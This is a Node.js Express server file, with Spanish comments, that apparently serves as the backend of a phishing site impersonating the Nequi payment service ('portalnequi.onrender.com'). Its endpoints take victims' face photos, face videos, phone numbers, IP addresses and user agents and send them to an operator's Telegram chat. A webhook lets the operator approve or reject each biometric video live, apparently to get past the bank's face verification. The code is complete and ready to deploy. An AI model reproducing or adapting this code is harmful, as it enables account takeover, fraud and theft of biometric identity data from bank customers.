// 📦 Backend Dinámico para Nequi - Sistema de Control con Telegram

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const multer = require('multer');

const upload = multer({ storage: multer.memoryStorage() });
const app = express();

// ==================== CONFIGURACIÓN CORS ====================
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'] }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));

// ==================== VARIABLES DE ENTORNO ====================
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const RENDER_URL = process.env.RENDER_URL || 'https://portalnequi.onrender.com';

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('⚠️ BOT_TOKEN o CHAT_ID no definidos');
}

// ==================== MEMORIA ====================
const sessionData = new Map();
const biometricStatus = new Map();

// ==================== HELPERS ====================
const tg = (method) =>
  `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

const generateSessionId = () =>
  `session_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;

// ==================== ENDPOINT PRINCIPAL ====================
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'Nequi Backend Dinámico',
    hasEnv: !!(BOT_TOKEN && CHAT_ID),
    status: 'running'
  });
});

// ==================== TEST TELEGRAM ====================
app.get('/test-telegram', async (_req, res) => {
  try {
    await axios.post(tg('sendMessage'), {
      chat_id: CHAT_ID,
      text: '🔥 TEST DESDE RENDER OK'
    });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// ==================== BIOMETRÍA FOTO ====================
app.post('/step-biometrics', async (req, res) => {
  try {
    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
    if (!sessionId || !imageBase64) {
      return res.status(400).json({ ok: false });
    }

    const buffer = Buffer.from(
      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
      'base64'
    );

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'biometria.jpg' });
    form.append(
      'caption',
`🧬 BIOMETRÍA FOTO
📱 ${phoneNumber || 'N/A'}
🆔 ${sessionId}
🌐 ${ip || 'N/A'}
🖥️ ${userAgent || 'N/A'}`
    );

    await axios.post(tg('sendPhoto'), form, {
      headers: form.getHeaders()
    });

    res.json({ ok: true });
  } catch (err) {
    console.error('❌ biometría foto:', err.message);
    res.status(500).json({ ok: false });
  }
});

// ==================== BIOMETRÍA VIDEO ====================
app.post('/api/verify-video', upload.single('video'), async (req, res) => {
  try {
    if (!req.file) return res.json({ success: false });

    const sessionId = generateSessionId();
    biometricStatus.set(sessionId, 'pending');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', req.file.buffer, {
      filename: 'biometria.webm'
    });

    await axios.post(tg('sendVideo'), form, {
      headers: form.getHeaders(),
      params: {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ APROBAR', callback_data: `approve_bio|${sessionId}` },
              { text: '❌ RECHAZAR', callback_data: `reject_bio|${sessionId}` }
            ]
          ]
        }
      }
    });

    res.json({ success: true, sessionId });
  } catch (err) {
    console.error('❌ biometría video:', err.message);
    res.json({ success: false });
  }
});

// ==================== CHECK BIOMETRÍA ====================
app.get('/api/check/:sessionId', (req, res) => {
  res.json({
    status: biometricStatus.get(req.params.sessionId) || 'pending'
  });
});

// ==================== WEBHOOK TELEGRAM ====================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const cq = req.body.callback_query;
    if (!cq) return res.sendStatus(200);

    const [action, sessionId] = cq.data.split('|');

    if (action === 'approve_bio') biometricStatus.set(sessionId, 'approved');
    if (action === 'reject_bio') biometricStatus.set(sessionId, 'rejected');

    await axios.post(tg('answerCallbackQuery'), {
      callback_query_id: cq.id,
      text: 'Acción registrada',
      show_alert: true
    });

    res.sendStatus(200);
  } catch (err) {
    console.error('❌ webhook:', err.message);
    res.sendStatus(200);
  }
});

// ==================== START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Servidor activo en puerto ${PORT}`);
});
